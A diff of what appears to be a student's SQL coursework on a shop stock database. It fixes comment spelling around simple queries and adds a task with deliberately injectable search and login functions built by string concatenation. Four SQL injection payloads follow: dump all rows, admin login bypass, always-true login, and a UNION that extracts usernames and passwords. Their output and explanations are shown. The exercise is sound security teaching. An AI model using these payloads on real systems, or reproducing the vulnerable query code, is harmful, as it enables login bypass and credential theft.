@@ -100,13 +100,13 @@ products.forEach(p => insertProduct.run(...p));
 screenshots_folder/select screenshot.png
 
 //TASK 2
-//Querry A
+//Query A
 console.log('\n--- Query A: All products ---');
 db.prepare('SELECT * FROM products').all().forEach(r => {
   console.log(`  [${r.id}] ${r.name.padEnd(20)}  cost=${String(r.cost_price.toLocaleString()).padStart(8)}  sell=${String(r.sell_price.toLocaleString()).padStart(8)}  stock=${r.stock}`);
 });
 
-//querry A output
+//query A output
 --- Query A: All products ---
   [1] Cement (bag)          cost=  28,000  sell=  35,000  stock=500
   [2] Iron Sheet 3m         cost=  85,000  sell= 110,000  stock=120
@@ -114,13 +114,13 @@ db.prepare('SELECT * FROM products').all().forEach(r => {
   [4] Nails 1kg             cost=   8,000  sell=  12,000  stock=300
   [5] Timber 2x4            cost=  18,000  sell=  25,000  stock=60
 
-//  Querry B
+//  Query B
 console.log('\n--- Query B: Name and sell price only ---');
 db.prepare('SELECT id, name, sell_price FROM products').all().forEach(r => {
   console.log(`  [${r.id}] ${r.name.padEnd(20)}  UGX ${r.sell_price.toLocaleString()}`);
  });
 
- //querry B output
+ //query B output
  Query B: Name and sell price only ---
   [1] Cement (bag)          UGX 35,000
   [2] Iron Sheet 3m         UGX 110,000
@@ -128,7 +128,7 @@ db.prepare('SELECT id, name, sell_price FROM products').all().forEach(r => {
   [4] Nails 1kg             UGX 12,000
   [5] Timber 2x4            UGX 25,000
 
-//  Querry C
+//  Query C
 console.log('\n--- Query C: Product with id = 3 ---');
 const one = db.prepare('SELECT * FROM products WHERE id = 3').get();
 console.log(`  Name:       ${one.name}`);
@@ -136,28 +136,28 @@ console.log(`  Cost price: UGX ${one.cost_price.toLocaleString()}`);
 console.log(`  Sell price: UGX ${one.sell_price.toLocaleString()}`);
 console.log(`  Stock:      ${one.stock} units`);
 
-//querry C output
+//query C output
 Query C: Product with id = 3 ---
   Name:       Paint 5L
   Cost price: UGX 45,000
   Sell price: UGX 60,000
   Stock:      80 units
 
-//   Querry D
+//   Query D
 console.log("\n--- Query D: Products with 'sheet' in the name ---");
 db.prepare("SELECT * FROM products WHERE name LIKE '%sheet%'").all()
    .forEach(r => console.log(`  [${r.id}] ${r.name}`));
 
-//querry D output
+//query D output
  Query D: Products with 'sheet' in the name ---
   [2] Iron Sheet 3m
 
-//Querry E
+//Query E
 console.log('\n--- Query E: Products sorted by sell price (highest first) ---');
 db.prepare('SELECT name, sell_price FROM products ORDER BY sell_price DESC').all()
 .forEach(r => console.log(`  ${r.name.padEnd(20)}  UGX ${r.sell_price.toLocaleString()}`));
 
-//querry E output
+//query E output
  Query E: Products sorted by sell price (highest first) ---
   Iron Sheet 3m         UGX 110,000
   Paint 5L              UGX 60,000
@@ -165,12 +165,12 @@ db.prepare('SELECT name, sell_price FROM products ORDER BY sell_price DESC').all
   Timber 2x4            UGX 25,000
   Nails 1kg             UGX 12,000
 
-//querry F
+//query F
 console.log('\n--- Query F: two most expensive products ---');
 db.prepare('SELECT id, name, sell_price FROM products ORDER BY sell_price DESC LIMIT 2').all()
 .forEach(r => console.log(`  [${r.id}] ${r.name.padEnd(20)}  UGX ${r.sell_price.toLocaleString()}`));
 
-//querry F output
+//query F output
 Query F: two most expensive products ---
   [2] Iron Sheet 3m         UGX 110,000
   [3] Paint 5L              UGX 60,000
@@ -187,3 +187,102 @@ Query G: Update the price of Cement (id=1) to 38,000 ---
 
   //task 2 screenshot
  screenshots_folder/task2 screenshot.png 
+
+//TASK 3
+//full vulnerable.js
+const { DatabaseSync } = require('node:sqlite');
+const db = new DatabaseSync('nyondo_stock.db');
+
+function searchProduct(name) {
+      const query = `SELECT id, name, cost_price, sell_price, stock FROM products WHERE name LIKE '%${name}%'`;
+  console.log(`\n  [QUERY] ${query}`);
+  try {
+    const rows = db.prepare(query).all();
+    console.log(`  [ROWS RETURNED] ${rows.length}`);
+    rows.forEach(r => {
+      const cost = typeof r.cost_price === 'number' ? r.cost_price.toLocaleString() : r.cost_price;
+      const sell = typeof r.sell_price === 'number' ? r.sell_price.toLocaleString() : r.sell_price;
+      console.log(`    -> ${String(r.name).padEnd(22)} cost=${String(cost).padStart(8)}  sell=${String(sell).padStart(8)}`);
+    });
+    return rows;
+  } catch (err) {
+    console.log(`  [DB ERROR] ${err.message}`);
+    return [];
+  }
+}
+
+function login(username, password) {
+      const query = `SELECT id, username, role FROM users WHERE username='${username}' AND password='${password}'`;
+  console.log(`\n  [QUERY] ${query}`);
+  try {
+    const row = db.prepare(query).get();
+    if (row) {
+      console.log(`  [LOGIN SUCCESS] Logged in as: ${row.username} | role: ${row.role}`);
+    } else {
+      console.log('  [LOGIN FAILED] No user found.');
+    }
+    return row;
+  } catch (err) {
+    console.log(`  [DB ERROR] ${err.message}`);
+    return null;
+  }
+}
+
+// // attack 1: Dump all products
+ searchProduct("'OR 1=1--");
+
+// // attack 2: login bypass with no password
+ login("admin'--", "anything");
+
+
+// // attack 3: always true login
+ login("'OR '1'='1", "'OR '1' ='1");
+
+
+// // attack 4: union attack
+ searchProduct("' UNION SELECT id, username, password, role, 0 FROM users--");
+
+ //query printed for each attack,why it worked and screenshot
+ //ATTACK 1
+  [QUERY] SELECT id, name, cost_price, sell_price, stock FROM products WHERE name LIKE '%'OR 1=1--%'
+  [ROWS RETURNED] 5
+    -> Cement (bag)           cost=  28,000  sell=  35,000
+    -> Iron Sheet 3m          cost=  85,000  sell= 110,000
+    -> Paint 5L               cost=  45,000  sell=  60,000
+    -> Nails 1kg              cost=   8,000  sell=  12,000
+    -> Timber 2x4             cost=  18,000  sell=  25,000
+
+Attack 1 worked because the condition 'OR 1=1' is always true therefore the database returns all rows and columns
+screenshots_folder/task3_attack1.png
+
+
+  //ATTACK 2
+   [QUERY] SELECT id, username, role FROM users WHERE username='admin'--' AND password='anything'
+  [LOGIN SUCCESS] Logged in as: admin | role: admin
+
+Attack 2 worked because '--' comments out the password therefore the person is logged in as admin with any password
+screenshots_folder/task3_attack2.png
+
+
+//ATTACK  3
+ [QUERY] SELECT id, username, role FROM users WHERE username=''OR '1'='1' AND password=''OR '1' ='1'
+  [LOGIN SUCCESS] Logged in as: admin | role: admin
+
+Attack 3 worked because OR '1'='1' is always true therefore the first user in the database is returned with no credentials
+screenshots_folder/task3_attack3.png
+
+//ATTACK  4
+
+  [QUERY] SELECT id, name, cost_price, sell_price, stock FROM products WHERE name LIKE '%' UNION SELECT id, username, password, role, 0 FROM users--%'
+  [ROWS RETURNED] 9
+    -> Cement (bag)           cost=  28,000  sell=  35,000
+    -> admin                  cost=admin123  sell=   admin
+    -> Iron Sheet 3m          cost=  85,000  sell= 110,000
+    -> fatuma                 cost= pass456  sell=attendant
+    -> Paint 5L               cost=  45,000  sell=  60,000
+    -> wasswa                 cost= pass789  sell= manager
+    -> Nails 1kg              cost=   8,000  sell=  12,000
+    -> aisha                  cost=  qwerty  sell=attendant
+    -> Timber 2x4             cost=  18,000  sell=  25,000
+Attack 4 worked because union select combines tables and steals usernames and passwords
+screenshots_folder/task3_attack4.png
